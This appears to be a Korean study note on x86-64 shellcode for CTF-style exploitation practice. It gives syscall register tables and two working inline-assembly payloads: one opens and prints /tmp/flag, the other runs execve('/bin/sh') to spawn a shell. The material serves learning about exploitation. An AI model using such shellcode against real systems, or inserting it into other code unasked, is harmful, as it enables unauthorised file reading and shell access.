# 🧠 Concept: Shellcode

## 📌 Definition
Exploit을 위해 제작된 Assembly 코드 조각

## 💻 orw shellcode
  
```c
char buf[0x30];

int fd = open("/tmp/flag", O_RDONLY, 0);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```

| syscall | rax  | arg0 (rdi)            | arg1 (rsi)      | arg2 (rdx)      |
|--------|------|----------------------|-----------------|-----------------|
| read   | 0x00 | unsigned int fd      | char *buf       | size_t count    |
| write  | 0x01 | unsigned int fd      | const char *buf | size_t count    |
| open   | 0x02 | const char *filename | int flags       | umode_t mode    |

### read

| register | 의미 |
|---------|------|
| rax | 0 (sys_read) |
| rdi | file descriptor |
| rsi | buffer address |
| rdx | 읽을 바이트 수 |

### write
| register | 의미 |
|---------|------|
| rax | 1 (sys_write) |
| rdi | file descriptor |
| rsi | buffer address |
| rdx | 출력할 바이트 수 |

---

## 📄 ORW Assembly Shellcode (C + Inline ASM)

```c
// File name: orw.c
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp\n"      // rdi = "/tmp/flag"
    "xor rsi, rsi\n"      // rsi = 0 ; O_RDONLY
    "xor rdx, rdx\n"      // rdx = 0
    "mov rax, 2\n"        // rax = syscall_open
    "syscall\n"

    "mov rdi, rax\n"      // rdi = fd
    "mov rsi, rsp\n"
    "sub rsi, 0x30\n"     // buffer = rsp - 0x30
    "mov rdx, 0x30\n"     // length = 0x30
    "mov rax, 0\n"        // syscall_read
    "syscall\n"

    "mov rdi, 1\n"        // stdout
    "mov rax, 1\n"        // syscall_write
    "syscall\n"

    "xor rdi, rdi\n"
    "mov rax, 0x3c\n"     // syscall_exit
    "syscall\n"
);

void run_sh();

int main() {
    run_sh();
}
```

## 💻 execve shellcode
- Shell: OS에 명령을 내리기 위해 사용되는 user interface
- Kernal: OS의 핵심 기능
- execve shellcode: 임의의 프로그램을 실행하는 shellcode

| syscall | rax  | arg0 (rdi)           | arg1 (rsi)               | arg2 (rdx)               |
|--------|------|----------------------|--------------------------|--------------------------|
| execve | 0x3b | const char *filename | const char *const *argv  | const char *const *envp  |

```c
execve("/bin/sh", NULL, NULL);
```

## 📄 execve Assembly Shellcode (C + Inline ASM)
```c
// File name: execve.c
// Compile: gcc -o execve execve.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "mov rax, 0x68732f6e69622f\n"
    "push rax\n"
    "mov rdi, rsp\n"     // rdi = "/bin/sh"
    "xor rsi, rsi\n"     // rsi = NULL
    "xor rdx, rdx\n"     // rdx = NULL
    "mov rax, 0x3b\n"    // syscall execve
    "syscall\n"

    "xor rdi, rdi\n"
    "mov rax, 0x3c\n"    // syscall exit
    "syscall\n"
);

void run_sh();

int main() {
    run_sh();
}
```
